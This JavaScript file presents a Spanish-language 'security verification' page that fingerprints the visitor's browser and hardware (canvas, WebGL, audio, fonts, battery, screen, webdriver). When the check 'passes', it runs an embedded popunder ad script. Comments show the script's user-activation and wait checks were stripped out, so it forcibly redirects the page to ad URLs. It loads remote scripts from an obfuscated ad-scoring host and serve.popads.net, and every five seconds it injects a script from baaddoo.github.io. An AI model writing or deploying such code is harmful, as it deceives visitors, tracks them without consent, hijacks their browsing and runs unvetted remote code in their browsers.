/* eslint-disable no-useless-escape */
/* eslint-disable no-unused-vars */
/* eslint-disable no-undef */
(async () => {
    // Definimos el HTML y el CSS en variables de JavaScript
    const htmlContent = `
        <div class="container">
            <h1 id="main-title">Verificación de Seguridad</h1>
            <div id="spinner" class="spinner"></div>
            <div id="status-message">Por favor, espera...</div>
            <ul class="verification-steps">
                <li class="step"><span class="step-icon" id="js-icon"></span><span id="js-text">Verificando JavaScript...</span></li>
                <li class="step"><span class="step-icon" id="webdriver-icon"></span><span id="webdriver-text">Detectando Webdriver...</span></li>
                <li class="step"><span class="step-icon" id="webgl-icon"></span><span id="webgl-text">Verificando capacidad de WebGL...</span></li>
                <li class="step"><span class="step-icon" id="canvas-icon"></span><span id="canvas-text">Generando huella digital de Canvas...</span></li>
                <li class="step"><span class="step-icon" id="cookie-icon"></span><span id="cookie-text">Verificando soporte de cookies...</span></li>
                <li class="step"><span class="step-icon" id="font-icon"></span><span id="font-text">Detectando fuentes del sistema...</span></li>
                <li class="step"><span class="step-icon" id="audio-icon"></span><span id="audio-text">Analizando huella de audio...</span></li>
                <li class="step"><span class="step-icon" id="battery-icon"></span><span id="battery-text">Comprobando estado de la batería...</span></li>
                <li class="step"><span class="step-icon" id="hardware-icon"></span><span id="hardware-text">Analizando hardware del procesador...</span></li>
                <li class="step"><span class="step-icon" id="input-icon"></span><span id="input-text">Detectando dispositivos de entrada...</span></li>
                <li class="step"><span class="step-icon" id="screen-icon"></span><span id="screen-text">Verificando resolución de pantalla...</span></li>
            </ul>
            <div id="final-message"></div>
            <div id="lock-result" class="lock-container">
                <svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                    <g>
                        <path class="lock-shackle" d="M50 15C50 7.5 57.5 1 65 1s15 6.5 15 14V30H85V14C85 4.5 75.5 0 65 0s-20 4.5-20 14v1z"/>
                        <rect class="lock-body" x="15" y="30" width="70" height="60" rx="10"/>
                    </g>
                </svg>
            </div>
            <canvas id="hidden-canvas" style="display:none;"></canvas>
        </div>
    `;

    const cssContent = `
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f0f4f8; margin: 0; transition: background-color 0.5s ease; }
        .container { background-color: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.1); text-align: center; max-width: 600px; width: 90%; }
        h1 { color: #1e3a8a; margin-top: 0; }
        .spinner { border: 5px solid rgba(30, 58, 138, 0.2); border-radius: 50%; border-top-color: #1e3a8a; width: 50px; height: 50px; animation: spin 1s ease-in-out infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .verification-steps { list-style: none; padding: 0; text-align: left; }
        .step { display: flex; align-items: center; font-size: 1.1em; color: #555; margin-bottom: 15px; }
        .step-icon { width: 24px; height: 24px; margin-right: 15px; font-weight: bold; }
        .success-icon { color: #28a745; }
        .fail-icon { color: #dc3545; }
        #final-message { margin-top: 30px; font-size: 1.2em; font-weight: bold; }
        .lock-container { width: 100px; height: 100px; margin: 20px auto; }
        .lock-body { fill: #4a5568; transition: transform 0.5s ease-in-out; }
        .lock-shackle { fill: #2d3748; transform-origin: 50% 15%; transition: transform 0.5s ease-in-out; }
        .open-lock .lock-shackle { transform: translateY(-20px) rotate(45deg); }
        .open-lock .lock-body { transform: translateY(10px); }
        .open-lock { animation: bounce 1s ease-in-out; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        .closed-lock { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
        .success-container { background-color: #e6f7ec; color: #28a745; }
        .fail-container { background-color: #fcebeb; color: #dc3545; }
        p { font-size: 1.2em; }
    `;

    // Función para añadir los estilos a la página
    function addStyles() {
        const styleSheet = document.createElement('style');
        styleSheet.textContent = cssContent;
        document.head.appendChild(styleSheet);
    }

    // Función para añadir el HTML al cuerpo de la página
    function addHtml() {
        document.body.innerHTML = htmlContent;
    }

    // Funciones de utilidad para la UI
    function updateStep(id, isSuccess) {
        const icon = document.getElementById(id + '-icon');
        const text = document.getElementById(id + '-text');
        icon.textContent = isSuccess ? '✅' : '❌';
        icon.classList.add(isSuccess ? 'success-icon' : 'fail-icon');
    }

    // --- Funciones de fingerprinting ---
    function checkJavaScript() {
        const result = true;
        updateStep('js', result);
        return result;
    }

    function getWebdriverStatus() {
        const result = !(window.navigator.webdriver);
        updateStep('webdriver', result);
        return result;
    }

    function getWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        let gl, result = 'n/a';
        try {
            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        } catch (e) {}
        if (gl) {
            const vendor = gl.getParameter(gl.VENDOR);
            const renderer = gl.getParameter(gl.RENDERER);
            const extensions = gl.getSupportedExtensions().sort().join(',');
            result = md5(`${vendor}-${renderer}-${extensions}`);
        }
        updateStep('webgl', result !== 'n/a');
        return result;
    }

    function getCanvasFingerprint() {
        const canvas = document.getElementById('hidden-canvas');
        if (!canvas) {
            updateStep('canvas', false);
            return 'n/a';
        }
        const ctx = canvas.getContext('2d');
        let result = 'n/a';
        if (ctx) {
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillText("Testing", 4, 30);
            const startTime = performance.now();
            const canvasData = canvas.toDataURL();
            const latency = performance.now() - startTime;
            result = md5(`${canvasData}-${latency}`);
        }
        updateStep('canvas', result !== 'n/a');
        return result;
    }

    function getCookieStatus() {
        const cookieName = 'test_cookie';
        document.cookie = `${cookieName}=1; path=/; max-age=10`;
        const result = document.cookie.includes(cookieName);
        updateStep('cookie', result);
        return result ? 'true' : 'false';
    }

    function getFontFingerprint() {
        const testFonts = ['monospace', 'serif', 'sans-serif', 'Arial', 'Times New Roman'];
        const installedFonts = testFonts.filter(font => document.fonts.check(`12px "${font}"`));
        const result = md5(installedFonts.join(','));
        updateStep('font', !!result);
        return result;
    }

    async function getWebAudioFingerprint() {
        try {
            const context = new (window.AudioContext || window.webkitAudioContext)();
            if (!context) {
                updateStep('audio', false);
                return 'n/a';
            }
            const oscillator = context.createOscillator();
            const gain = context.createGain();
            oscillator.connect(gain);
            gain.connect(context.destination);
            const fingerprint = md5(`${oscillator.frequency.value}-${gain.gain.value}`);
            updateStep('audio', true);
            return fingerprint;
        } catch (e) {
            updateStep('audio', false);
            return 'n/a';
        }
    }

    async function getBatteryStatus() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                const result = `level:${Math.floor(battery.level * 100)}-charging:${battery.charging}`;
                updateStep('battery', true);
                return result;
            } catch (e) {
                updateStep('battery', false);
                return 'n/a';
            }
        } else {
            updateStep('battery', false);
            return 'n/a';
        }
    }

    function getHardwareConcurrency() {
        const concurrency = navigator.hardwareConcurrency || 0;
        updateStep('hardware', concurrency > 0);
        return concurrency;
    }
    
    function getInputDevices() {
        const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
        const hasMouse = matchMedia('(pointer:fine)').matches;
        
        const result = `touch:${hasTouch},mouse:${hasMouse}`;
        updateStep('input', hasTouch || hasMouse);
        return result;
    }

    function getScreenResolution() {
        const result = `${screen.width}x${screen.height}-${window.innerWidth}x${window.innerHeight}`;
        const success = (screen.width > 0 && screen.height > 0);
        updateStep('screen', success);
        return result;
    }

    // --- Lógica principal ---
    async function startVerification() {
        const isJsEnabled = checkJavaScript();
        
        if (isJsEnabled) {
            const webdriverStatus = getWebdriverStatus();
            const webglFingerprint = getWebGLFingerprint();
            const canvasFingerprint = getCanvasFingerprint();
            const cookiesEnabled = getCookieStatus();
            const fontFingerprint = getFontFingerprint();
            const audioFingerprint = await getWebAudioFingerprint();
            const batteryStatus = await getBatteryStatus();
            const hardwareConcurrency = getHardwareConcurrency();
            const inputDevices = getInputDevices();
            const screenResolution = getScreenResolution();
            
            // Ocultar spinner y mensaje de espera
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('status-message').style.display = 'none';

            // Lógica de validación
            let isSuccess = true;
            const failedChecks = [];
            
            const messageTitle = document.getElementById('main-title');
            const lockContainer = document.getElementById('lock-result');
            const finalMessage = document.getElementById('final-message');
            
            // Definir las comprobaciones aquí
            if (webdriverStatus === false) { isSuccess = false; failedChecks.push('Webdriver'); }
            if (webglFingerprint === 'n/a' || !webglFingerprint) { isSuccess = false; failedChecks.push('WebGL'); }
            if (canvasFingerprint === 'n/a' || !canvasFingerprint) { isSuccess = false; failedChecks.push('Canvas'); }
            if (cookiesEnabled === 'false') { isSuccess = false; failedChecks.push('Cookies'); }
            if (fontFingerprint === 'n/a' || !fontFingerprint) { isSuccess = false; failedChecks.push('Fuentes'); }
            if (audioFingerprint === 'n/a' || !audioFingerprint) { isSuccess = false; failedChecks.push('Audio API'); }
            if (hardwareConcurrency === 0) { isSuccess = false; failedChecks.push('Hardware'); }
            if (inputDevices === 'touch:false,mouse:false') { isSuccess = false; failedChecks.push('Dispositivos de Entrada'); }
            if (screenResolution === 'n/a' || screenResolution === '0x0-0x0') { isSuccess = false; failedChecks.push('Resolución de Pantalla'); }

            if (isSuccess) {
                messageTitle.textContent = 'Acceso Concedido';
                finalMessage.innerHTML = 'Tu navegador ha pasado todas las comprobaciones de seguridad.';
                document.body.classList.add('success-container');
                lockContainer.classList.add('open-lock');

                // --- CÓDIGO DE PUBLICIDAD INCLUIDO AQUÍ ---
                (function(window, document, screen) {
                    Function.prototype.bind || (Function.prototype.bind = function(thisArg) {
                        if (typeof this !== "function") {
                            throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
                        }
                        var args = Array.prototype.slice.call(arguments, 1);
                        var self = this;
                        var noOp = function() {};
                        var bound = function() {
                            return self.apply(this instanceof noOp && thisArg ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)));
                        };
                        noOp.prototype = this.prototype;
                        bound.prototype = new noOp;
                        return bound;
                    });
                
                    var utils = {
                        _openAd: function(url, options) {
                            window.location.href = url;
                            return true;
                        },
                        abortPop: function() {
                            this.clearUrls();
                        },
                        init: function(config) {
                            // CAMBIO 1: Eliminada la comprobación de navigator.userActivation
                            this.userActivation = true;
                            this.urls = [];
                            this.settings = {};
                            this.settings.crtimeout = config.crtimeout || 60 * 1000;
                            this.settings.onbeforeopen = config.onbeforeopen;
                            this.settings.onafteropen = function() {
                                this.adfired = true;
                            }.bind(this);
                            this.settings.ignorefailure = config.ignorefailure || false;
                            this.settings.openernull = true;
                        },
                        clearUrls: function() {
                            this.urls = [];
                        },
                        addUrl: function(url, options) {
                            if (!url.match(/^https?:\/\//)) return false;
                            this.urls.push({
                                url: url,
                                options: options
                            });
                            this._preparePop();
                        }
                    };
                
                    var Base64 = {
                        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                        encode: function(input) {
                            var output = "";
                            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
                            var i = 0;
                            input = Base64._utf8_encode(input);
                            while (i < input.length) {
                                chr1 = input.charCodeAt(i++);
                                chr2 = input.charCodeAt(i++);
                                chr3 = input.charCodeAt(i++);
                                enc1 = chr1 >> 2;
                                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                                enc4 = chr3 & 63;
                                if (isNaN(chr2)) {
                                    enc3 = enc4 = 64;
                                } else if (isNaN(chr3)) {
                                    enc4 = 64;
                                }
                                output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
                            }
                            return output;
                        },
                        decode: function(input) {
                            var output = "";
                            var chr1, chr2, chr3;
                            var enc1, enc2, enc3, enc4;
                            var i = 0;
                            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
                            while (i < input.length) {
                                enc1 = this._keyStr.indexOf(input.charAt(i++));
                                enc2 = this._keyStr.indexOf(input.charAt(i++));
                                enc3 = this._keyStr.indexOf(input.charAt(i++));
                                enc4 = this._keyStr.indexOf(input.charAt(i++));
                                chr1 = (enc1 << 2) | (enc2 >> 4);
                                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                                chr3 = ((enc3 & 3) << 6) | enc4;
                                output = output + String.fromCharCode(chr1);
                                if (enc3 !== 64) {
                                    output = output + String.fromCharCode(chr2);
                                }
                                if (enc4 !== 64) {
                                    output = output + String.fromCharCode(chr3);
                                }
                            }
                            output = Base64._utf8_decode(output);
                            return output;
                        },
                        _utf8_encode: function(string) {
                            string = string.replace(/\r\n/g, "\n");
                            var utftext = "";
                            for (var n = 0; n < string.length; n++) {
                                var c = string.charCodeAt(n);
                                if (c < 128) {
                                    utftext += String.fromCharCode(c);
                                } else if ((c > 127) && (c < 2048)) {
                                    utftext += String.fromCharCode((c >> 6) | 192);
                                    utftext += String.fromCharCode(((c & 63) | 128));
                                } else {
                                    utftext += String.fromCharCode((c >> 12) | 224);
                                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                                    utftext += String.fromCharCode((c & 63) | 128);
                                }
                            }
                            return utftext;
                        },
                        _utf8_decode: function(utftext) {
                            var string = "";
                            var i = 0;
                            var c = 0,
                                c1 = 0,
                                c2 = 0;
                            while (i < utftext.length) {
                                c = utftext.charCodeAt(i);
                                if (c < 128) {
                                    string += String.fromCharCode(c);
                                    i++;
                                } else if ((c > 191) && (c < 224)) {
                                    c2 = utftext.charCodeAt(i + 1);
                                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                                    i += 2;
                                } else {
                                    c2 = utftext.charCodeAt(i + 1);
                                    c3 = utftext.charCodeAt(i + 2);
                                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                                    i += 3;
                                }
                            }
                            return string;
                        }
                    };
                
                    "use strict";
                    var BASE_PATH = "/c";
                    var POP_GLOBAL_VAR = "_pop";
                    var PAO_GLOBAL_VAR = "_pao";
                    window.Base64 = Base64;
                    var currentScriptElement = document.currentScript;
                    var adscoreTimeout = null;
                
                    var adManager = {
                        _inventory: {},
                        _config: {
                            _siteId: 0,
                            _minBid: 0,
                            _blockedCountries: false,
                            _default: false,
                            _defaultType: "popunder",
                            _useOverlay: true,
                            _trafficType: 0,
                            _popunderFailover: "tabup",
                            _adscorebp: null,
                            _adscorept: null,
                            _adscoreak: "QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c"
                        },
                        _init: function() {
                            var self = this;
                            this._loadConfig();
                            this.adfired = false;
                            utils.init({
                                prepop: false,
                                catchalldiv: "never",
                                onafteropen: function() {
                                    self.adfired = true;
                                }
                            });
                            this._adscoreDeploy();
                        },
                        _adscoreDeploy: function() {
                            var self = this;
                            var adscoreScriptTimeout = 0;
                            var config = this._config;
                            if (self._config._adscorebp) {
                                self._checkInventory(self._config._adscorebp);
                            } else if (typeof AdscoreInit === "function") {
                                try {
                                    AdscoreInit(self._config._adscoreak, {
                                        sub_id: config._siteId,
                                        callback: function(result) {
                                            self._checkInventory(result.signature || "2" + result.error);
                                        }
                                    });
                                } catch (e) {
                                    self._checkInventory("4" + e.message);
                                }
                            } else if (document.body) {
                                var domainParts = ["re", "adsco"];
                                domainParts.push(domainParts[1][3]);
                                var adscoreUrl = "https://" + domainParts.reverse().join(".") + "/";
                                var script = document.createElement("script");
                                script.src = adscoreUrl;
                                try {
                                    script.onerror = function() {
                                        if (script.src === adscoreUrl) {
                                            script.src = "https://" + Math.round(Math.pow(52292.244664, 2)) + "/a.js";
                                        } else {
                                            clearTimeout(adscoreScriptTimeout);
                                            self._checkInventory("1");
                                        }
                                    };
                                } catch (e) {}
                                script.onload = function() {
                                    clearTimeout(adscoreScriptTimeout);
                                    try {
                                        AdscoreInit(self._config._adscoreak, {
                                            sub_id: config._siteId,
                                            callback: function(result) {
                                                self._checkInventory(result.signature || "2" + result.error);
                                            }
                                        });
                                    }
                                    catch (e) {
                                        self._checkInventory("4" + e.message);
                                    }
                                };
                                document.body.appendChild(script);
                                adscoreScriptTimeout = setTimeout(function() {
                                    self._checkInventory("3");
                                }, 5000);
                            } else {
                                setTimeout(function() {
                                    self._adscoreDeploy();
                                }, 50);
                            }
                        },
                        _checkInventory: function(adscoreSignature) {
                            this._lastci = (new Date).getTime();
                            utils.clearUrls();
                            var self = this;
                            var intervalId = 0;
                            var config = this._config;
                            if (config._adscorept) {
                                config._adscorept(adscoreSignature);
                            }
                            try {
                                clearTimeout(adscoreTimeout);
                            } catch (e) {}
                            adscoreTimeout = setTimeout(function() {
                                self._adscoreDeploy();
                            }, 300000);
                            intervalId = setInterval(function() {
                                var inventoryUrl = "//serve.popads.net" + BASE_PATH;
                                if (document.body) {
                                    clearInterval(intervalId);
                                    var params = {
                                        _: encodeURIComponent(adscoreSignature),
                                        v: 4,
                                        siteId: config._siteId,
                                        minBid: config._minBid,
                                        blockedCountries: config._blockedCountries || "",
                                        documentRef: encodeURIComponent(document.referrer),
                                    };
                                    for (var key in params) {
                                        if (params.hasOwnProperty(key)) {
                                            inventoryUrl += (inventoryUrl.indexOf("?") !== -1 ? "&" : "?") + key + "=" + (params[key] || "");
                                        }
                                    }
                                    var script = document.createElement("script");
                                    script.referrerPolicy = "unsafe-url";
                                    script.src = inventoryUrl;
                                    try {
                                        script.onerror = function() {
                                            utils.abortPop();
                                            currentScriptElement.onerror();
                                        };
                                    } catch (e) {}
                                    document.body.appendChild(script);
                                }
                            }, 100);
                        },
                        _parseInventory: function(inventoryData) {
                            this._inventory = inventoryData || {};
                            this._preparePop();
                        },
                        _preparePopDefault: function() {
                            if (this._config._default === false || this._config._default === "") {
                                utils.abortPop();
                            } else {
                                window.location.href = this._config._default;
                            }
                        },
                        _preparePopInventory: function() {
                            var self = this;
                            const inventoryUrl = self._inventory.url;
                            window.location.href = inventoryUrl;
                
                            try {
                                clearTimeout(adscoreTimeout);
                            } catch (e) {}
                        },
                        _preparePop: function() {
                            if (this._inventory.url !== "") {
                                this._preparePopInventory();
                            } else {
                                this._preparePopDefault();
                            }
                        },
                        _waitForGoodWeather: function() {
                            // CAMBIO 2: Eliminada la lógica de espera
                            setTimeout(this._init.bind(this), 0);
                        },
                        _loadConfig: function() {
                            var globalConfig = window[POP_GLOBAL_VAR] || [];
                            var config = this._config;
                            for (var i = 0; i < globalConfig.length; i++) {
                                var key = globalConfig[i][0];
                                var value = globalConfig[i][1];
                                switch (key) {
                                    case "siteId":
                                    case "delayBetween":
                                    case "defaultPerIP":
                                    case "trafficType":
                                        value = parseInt(value, 10);
                                        if (isNaN(value)) continue;
                                }
                                switch (key) {
                                    case "siteId":
                                        config._siteId = value;
                                        break;
                                    case "minBid":
                                        config._minBid = value;
                                        break;
                                    case "blockedCountries":
                                        config._blockedCountries = value;
                                        break;
                                    case "default":
                                        config._default = value;
                                        break;
                                    case "defaultType":
                                        config._defaultType = value;
                                        break;
                                    case "topmostLayer":
                                        config._useOverlay = value;
                                        break;
                                    case "trafficType":
                                        config._trafficType = value;
                                        break;
                                    case "popunderFailover":
                                        config._popunderFailover = value;
                                        break;
                                    case "prepop":
                                        break;
                                    case "adscorebp":
                                        config._adscorebp = value;
                                        break;
                                    case "adscorept":
                                        config._adscorept = value;
                                        break;
                                    case "adscoreak":
                                        config._adscoreak = value;
                                        break;
                                }
                            }
                        }
                    };
                    for (var prop in window) {
                        try {
                            if (prop.match(/[0-9a-f]{32,32}/) && window[prop] && window[prop].length >= 7 && window[prop][0] && window[prop][0][0] && !isNaN(parseFloat(window[prop][0][1])) && isFinite(window[prop][0][1])) {
                                POP_GLOBAL_VAR = prop;
                                window[prop.slice(0, 16) + prop.slice(0, 16)] = window[prop];
                                break;
                            }
                        } catch (e) {}
                    }
                    if (!"//serve.popads.net".includes(".net")) {
                        PAO_GLOBAL_VAR = "";
                        var randomLength = 10 + Math.floor(10 * Math.random());
                        for (var i = 0; i < randomLength; i++) {
                            PAO_GLOBAL_VAR += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
                        }
                        BASE_PATH = "/" + PAO_GLOBAL_VAR;
                    }
                    var publicApi = {
                        parse: function(inventoryData) {
                            adManager._parseInventory(inventoryData);
                        },
                        fbparse: function(bannerData) {
                            utils._openAd(bannerData.url, {});
                        },
                    };
                    try {
                        window._pao = publicApi;
                        Object.freeze(window._pao);
                    } catch (e) {}
                    try {
                        window[PAO_GLOBAL_VAR] = publicApi;
                        Object.freeze(window[PAO_GLOBAL_VAR]);
                    } catch (e) {}
                    if (!navigator.userAgent.includes("://")) {
                        adManager._waitForGoodWeather();
                    }
                })(window, window.document, window.screen);

            } else {
                messageTitle.textContent = 'Acceso Denegado';
                finalMessage.innerHTML = `Fallo en la verificación de seguridad. No se pudo validar tu navegador. Razón: ${failedChecks.join(', ')}`;
                document.body.classList.add('fail-container');
                lockContainer.classList.add('closed-lock');
            }
        } else {
            // Si JavaScript está desactivado
            document.getElementById('status-message').textContent = 'JavaScript está deshabilitado. No se puede continuar.';
        }
    }

    // --- Lógica para cargar los scripts de publicidad constantemente ---
    function loadAdScripts() {
        var pa = document.createElement('script');
        pa.type = 'text/javascript';
        pa.async = true;
        var s = document.getElementsByTagName('script')[0];
        pa.src = '//baaddoo.github.io/pop7.js?v=u';
        pa.onerror = function () {
            var sa = document.createElement('script');
            sa.type = 'text/javascript';
            sa.async = true;
            sa.src = '//baaddoo.github.io/pop7.js?v=h';
            s.parentNode.insertBefore(sa, s);
        };
        s.parentNode.insertBefore(pa, s);
    }
    
    // Inicia las llamadas a los scripts de publicidad en un intervalo
    setInterval(loadAdScripts, 5000); // Llama a la función cada 5 segundos
    
    // Inicia las llamadas al fingerprinting en un intervalo
    setInterval(async () => {
        // Asegura que el DOM y el script md5 estén cargados antes de verificar
        await new Promise(resolve => document.addEventListener('DOMContentLoaded', resolve));
        const md5Script = document.createElement('script');
        md5Script.src = "https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js";
        md5Script.onload = async () => {
            await startVerification();
        };
        document.body.appendChild(md5Script);
    }, 5000); // Llama a la función cada 5 segundos

})();
